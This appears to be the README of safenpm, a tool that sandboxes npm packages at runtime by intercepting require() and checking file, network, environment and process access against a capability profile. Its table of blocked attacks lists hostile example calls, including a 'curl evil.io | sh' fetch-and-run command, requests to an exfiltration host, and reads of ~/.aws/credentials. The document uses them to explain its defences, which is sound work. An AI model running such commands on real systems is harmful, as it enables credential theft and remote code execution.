# safenpm

**Behavioral sandbox for npm packages — per-package runtime capability enforcement.**

safenpm prevents malicious or compromised npm packages from stealing your credentials, exfiltrating data over the network, or spawning unauthorized processes — all without modifying your application code.

---

## The Problem

When you run `npm install`, every package in your dependency tree gains the same runtime privileges as your application: it can read `~/.aws/credentials`, make HTTP requests to any server, and spawn shell commands. A single compromised package in your tree can silently exfiltrate everything.

Python's `venv` only isolates *versions* — it does nothing about runtime capabilities. OS-level containers are heavy and don't give per-package granularity. safenpm fills the gap.

---

## How It Works

```
npm install express          ← installs packages normally
safenpm install express      ← installs AND generates a capability profile
node --require safenpm app   ← runs your app with the enforcer active
```

### The three components

**1. Profiler** — scans your `node_modules` and generates a `package-capabilities.json` file that declares what each package is allowed to do:

```json
{
  "version": "1.0",
  "packages": {
    "express": {
      "fs": { "read": [], "write": [] },
      "net": { "outbound": true, "hosts": ["*"] },
      "env": [],
      "child_process": { "allowed": false },
      "hasNativeModules": false,
      "approvedBy": "auto"
    }
  }
}
```

**2. Enforcer** — loaded via `--require` before your application starts. It patches `Module._load` (Node's internal module loader) to intercept every `require()` call — static or dynamic. When a package requires `fs`, `net`, `http`, `https`, `dns`, or `child_process`, it receives a *shim* instead of the real module. Every method call on the shim is checked against the package's profile before execution.

**3. Violation logger** — every blocked or suspicious access is written to `.safenpm-violations.log` and printed to stderr with color-coded severity:
- `CRITICAL` — credential theft attempt (e.g. reading `~/.aws/credentials`)
- `HIGH` — unauthorized network or process spawn
- `MEDIUM` — env mutation
- `LOW` — undeclared env var access (allowed but audited)

### How caller identification works

When a package calls `require('fs')`, Node calls `Module._load('fs', parent, false)`. The `parent` object contains the filename of the calling module — e.g. `/project/node_modules/malicious-pkg/index.js`. safenpm extracts `malicious-pkg` from this path using a regex that correctly handles scoped packages (`@aws-sdk/client-s3`) and nested `node_modules` (monorepo deduplication). If no `node_modules` segment is found, the caller is treated as application code and gets unrestricted access.

### What is blocked

| Attack vector | How it's blocked |
|---|---|
| `readFileSync('~/.aws/credentials')` | fs shim checks path against profile's `fs.read` allowlist |
| `readFileSync('/etc/passwd')` | `isSensitivePath()` flags known credential locations regardless of profile |
| `https.request('evil.exfil.io', ...)` | net/http/https shims check host against profile's `net.hosts` allowlist |
| `dns.lookup('BASE64DATA.evil.io')` | exfil detector flags base64/hex-encoded subdomains as DNS exfiltration |
| `process.env.AWS_SECRET_ACCESS_KEY` | env proxy intercepts `process.env` reads; known secret names return `undefined` |
| `execSync('curl evil.io | sh')` | child_process shim checks `child_process.allowed` before any spawn |
| `require('node:fs').readFileSync(...)` | `node:` prefix is normalized before lookup — same interception applies |
| `const m = 'fs'; require(m)` | `Module._load` intercepts all requires regardless of how the string was built |
| `@scope/malicious-pkg` | Caller resolver handles scoped package names in the path regex |

---

## Installation

```bash
# Clone and install dev dependencies
git clone <repo>
cd safenpm
npm install

# Build the CLI
npm run build

# Link the binary globally (optional)
npm link
```

---

## Usage

### Step 1 — Profile your project

```bash
# Install a package and generate its capability profile
safenpm install express

# Re-profile all currently installed packages (no new install)
safenpm install

# Install multiple packages
safenpm install express lodash axios
```

This writes `package-capabilities.json` to your project root. Review it — it declares what each package is allowed to do at runtime.

### Step 2 — Run your app with the enforcer

```bash
# Development
node --require safenpm src/index.js

# With ts-node
node --require safenpm --require ts-node/register src/index.ts

# With environment variable (applies to all node invocations)
export NODE_OPTIONS="--require safenpm"
node src/index.js
```

### Step 3 — Review violations

```bash
# View the violation log
cat .safenpm-violations.log

# Check currently profiled packages
safenpm status
```

### Example violation output

```
[safenpm] BLOCKED [CRITICAL] malicious-pkg attempted: readFileSync(/home/user/.aws/credentials)
  Reason: CREDENTIAL_THEFT_ATTEMPT
  Package: malicious-pkg@1.0.0
```

---

## The capability profile format

`package-capabilities.json` lives at your project root. Edit it manually to grant or restrict access.

```json
{
  "version": "1.0",
  "generatedAt": "2024-01-15T10:30:00Z",
  "projectRoot": "/home/user/my-project",
  "packages": {
    "sharp": {
      "version": "0.33.0",
      "fs": {
        "read":  ["/tmp/**", "/usr/lib/**"],
        "write": ["/tmp/**"]
      },
      "net": { "outbound": false, "hosts": [] },
      "env": [],
      "child_process": { "allowed": false },
      "worker_threads": false,
      "hasNativeModules": true,
      "approvedBy": "user",
      "approvedAt": "2024-01-15T10:35:00Z",
      "userNote": "Image processing — needs /tmp for intermediate files"
    }
  }
}
```

### Field reference

| Field | Type | Description |
|---|---|---|
| `fs.read` | `string[]` | Path patterns the package may read. Supports exact paths, `/dir/**` globs |
| `fs.write` | `string[]` | Path patterns the package may write |
| `net.outbound` | `boolean` | Whether any outbound connections are allowed |
| `net.hosts` | `string[]` | Allowed hostnames. `*` = any, `*.example.com` = subdomain wildcard |
| `env` | `string[]` | Environment variable names the package may read |
| `child_process.allowed` | `boolean` | Whether the package may spawn processes |
| `child_process.allowedCommands` | `string[]?` | If set, restricts which executables may be spawned |
| `worker_threads` | `boolean` | Whether the package may create worker threads |
| `hasNativeModules` | `boolean` | Auto-detected. Native `.node` addons bypass JS-level shims |
| `approvedBy` | `"auto"\|"user"\|"registry"` | Who approved this profile |

---

## Project structure

```
safenpm/
├── src/
│   ├── capabilities/
│   │   ├── schema.ts          # Central TypeScript interfaces (PackageCapability, Violation, etc.)
│   │   ├── path-matcher.ts    # Path allowlist matching with glob support
│   │   ├── reader.ts          # Load package-capabilities.json from disk
│   │   └── writer.ts          # Write package-capabilities.json to disk
│   ├── enforcer/
│   │   ├── index.ts           # Entry point — call installInterceptor() via --require
│   │   ├── module-interceptor.ts  # Patches Module._load, routes require() to shims
│   │   ├── caller-resolver.ts     # Identifies which npm package made a require() call
│   │   ├── violation-logger.ts    # Writes violations to log file + stderr
│   │   └── shims/
│   │       ├── fs.shim.ts         # Intercepts fs module (16 read ops, 10 write ops)
│   │       ├── env.proxy.ts       # Proxy around process.env
│   │       ├── net.shim.ts        # Intercepts net.connect / net.createConnection
│   │       ├── http.shim.ts       # Intercepts http.request / http.get
│   │       ├── https.shim.ts      # Intercepts https.request / https.get
│   │       ├── dns.shim.ts        # Intercepts DNS lookups + exfiltration detection
│   │       ├── child-process.shim.ts  # Intercepts exec/spawn/fork
│   │       └── net-helpers.ts     # Shared host resolution and checking logic
│   ├── profiler/
│   │   ├── index.ts           # Orchestrator — resolver + native-detector + profile-builder
│   │   ├── package-resolver.ts    # Reads node_modules, returns installed package list
│   │   ├── native-detector.ts     # Detects .node binary addons recursively
│   │   ├── profile-builder.ts     # Converts observations → PackageCapability
│   │   └── registry-client.ts     # Fetches download counts from npm registry
│   ├── ui/
│   │   ├── approval-prompt.ts     # formatProfile() — human-readable capability summary
│   │   └── diff-display.ts        # diffProfiles() — detects capability changes between versions
│   ├── cli/
│   │   ├── index.ts           # CLI entry point — routes to commands
│   │   ├── install.ts         # `safenpm install` — npm install + profile + write
│   │   └── args.ts            # parseArgs() — pure CLI argument parser
│   └── utils/
│       ├── path-resolver.ts   # Resolves ~, relative, and absolute paths
│       ├── secret-detector.ts # Identifies credential env var names by name + pattern
│       ├── exfil-detector.ts  # Detects base64/hex-encoded subdomains (DNS exfiltration)
│       └── stack-parser.ts    # Parses v8 Error.stack into structured StackFrame[]
├── test/
│   ├── fixtures/              # Simulated malicious and legitimate npm packages
│   │   ├── malicious-fs/      # Reads ~/.aws/credentials, readdirSync(home), statSync(.ssh)
│   │   ├── malicious-env/     # Reads AWS_SECRET_ACCESS_KEY, DATABASE_URL, custom secrets
│   │   ├── malicious-net/     # https.request to evil.exfil.io
│   │   ├── malicious-dns/     # DNS lookup with base64-encoded exfiltration subdomain
│   │   ├── malicious-spawn/   # execSync shell command, spawn('sh', ...)
│   │   ├── malicious-node-prefix/  # Uses require('node:fs') to attempt bypass
│   │   └── legitimate-package/     # Well-behaved package — reads /tmp, reads NODE_ENV
│   ├── helpers/
│   │   └── run-with-enforcer.ts    # Integration test helper — spawns child processes
│   ├── unit/                  # 207 unit tests across all modules
│   └── integration/           # 93 integration tests across 10 test files
├── package-capabilities.json  # Generated by `safenpm install` (your project's policy file)
├── .safenpm-violations.log    # Runtime violation log (appended to during execution)
├── TASKS.md                   # Full TDD task checklist (all 60+ tasks completed)
├── BUILD_LOG.md               # Detailed build history with decisions and fixes
└── PLAN.md                    # Original implementation plan
```

---

## Development

```bash
# Run all tests
npm test

# Run only unit tests
npm run test:unit

# Run only integration tests
npm run test:integration

# Watch mode during development
npm run test:watch

# Type check without emitting
npx tsc --noEmit

# Lint
npm run lint
```

### Test results

```
28 test files   300 tests   0 failures
```

Tests are organized by TDD discipline: every test was written before its implementation. Integration tests spawn real child processes with the enforcer loaded via `--require`, verifying end-to-end behaviour against realistic attack fixtures.

---

## Security model and limitations

**What safenpm protects against:**
- Malicious packages reading credential files (`~/.aws/credentials`, `~/.ssh/id_rsa`, `/etc/shadow`)
- Environment variable theft (`AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, and 24+ known secret names)
- Unauthorized outbound HTTP/HTTPS/TCP connections
- DNS exfiltration via base64/hex-encoded subdomains
- Unauthorized process spawning and shell injection
- `node:fs` prefix bypass (Node 14.18+ syntax)
- Dynamic `require()` bypass attempts

**Current limitations (known):**
- **Native modules bypass JS shims.** Packages with `.node` binary addons run native code that `Module._load` cannot intercept. safenpm detects and flags these with `hasNativeModules: true` so you can decide whether to trust them.
- **ESM (`.mjs`) is not intercepted.** The `Module._load` patch only covers CommonJS. ES module interception requires a separate `--experimental-loader` hook (planned).
- **Profiles are auto-generated as all-deny.** The profiler doesn't yet run install scripts in a sandbox to observe real behavior — it generates conservative deny-all profiles that users can expand.
- **No registry consensus yet.** The `approvedBy: 'registry'` tier (crowd-sourced profiles) is designed but not yet populated.

---

## How it differs from other tools

| Tool | What it does | What it misses |
|---|---|---|
| `npm audit` | Reports known CVEs | Can't stop a 0-day or a new malicious package |
| `socket.dev` | Static analysis at install time | Can't enforce at runtime |
| `venv` (Python) | Version isolation only | No capability enforcement |
| Docker/containers | OS-level isolation | Per-package granularity, heavy setup |
| **safenpm** | Runtime capability enforcement per package | Native addons, ESM (in progress) |

---

## License

MIT
